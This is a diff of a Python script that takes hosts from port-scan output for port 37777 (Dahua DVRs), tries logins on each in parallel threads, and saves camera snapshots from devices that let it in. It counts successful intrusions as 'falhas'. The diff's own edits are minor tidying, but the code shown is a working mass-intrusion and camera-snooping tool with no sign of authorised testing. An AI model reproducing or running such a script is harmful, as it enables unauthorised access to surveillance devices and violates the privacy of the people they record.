@@ -1,11 +1,7 @@
-# -*- coding: utf-8 -*-
-#!/usr/bin/env python
-
 from threading import Thread
-import gc,time
-import time,os
-from utils.dahua import DahuaController, HTTP_API_REQUESTS
 from tqdm import tqdm
+from utils import *
+import time,os
 
 
 def clear():
@@ -34,11 +30,11 @@ f = open("ips.txt", "r")
 
 for x in f:
       ip = x.rstrip('\n')
-     
+
       preeip = ip.replace("Discovered open port 37777/tcp on ",'')
       preeeip = preeip.replace(" ",'')
       tt.append(str(preeeip))
-     
+
 
 tok = int(len(tt))
 print('[!] O total de',str(tok), 'IPs vão ser analizados')
@@ -46,14 +42,14 @@ print('[!] O total de',str(tok), 'IPs vão ser analizados')
 
 def dahua_login(server_ip, port, login, password):
     global ipok
-    
+
     try:
         dahua = DahuaController(server_ip, port, login, password)
         #print("%s Snapshot capturada" % server_ip)
     except Exception as e:
         print(e, 'dahua_login login')
-        
-        
+
+
     if dahua.status == 0:
         return True
     elif dahua.status == 2:
@@ -94,7 +90,7 @@ def make_snapshots(server_ip,login,password):
 
 
             imgt += 1
-            
+
             snapshots_counts += 1
             ok = True
             dead_counter = 0
@@ -102,7 +98,7 @@ def make_snapshots(server_ip,login,password):
             #print(e, 'make_snapshots save')
             ok = False
             continue
-        
+
 
 
 
@@ -115,7 +111,7 @@ def Auth(i):
         if res:
             ipok += 1
             make_snapshots(Server,usr,senha)
-            
+
             return True
         else:
             fail += 1
@@ -131,12 +127,14 @@ for i in tqdm(tt):
      t1 = Thread(target=Auth, args=(i,))
      t1.start()
      pass
-    except:
-     pass
+    except Exception as e:
+        print(e)
+        pass
 
 def start():
     print('[!] O Total de',(str(fail) + str(ipok)), 'foram analizados, apenas',  str(ipok), 'possuem falhas!', str(imgt) , "tiradas")
     return True
+
 
 start()
 use = True
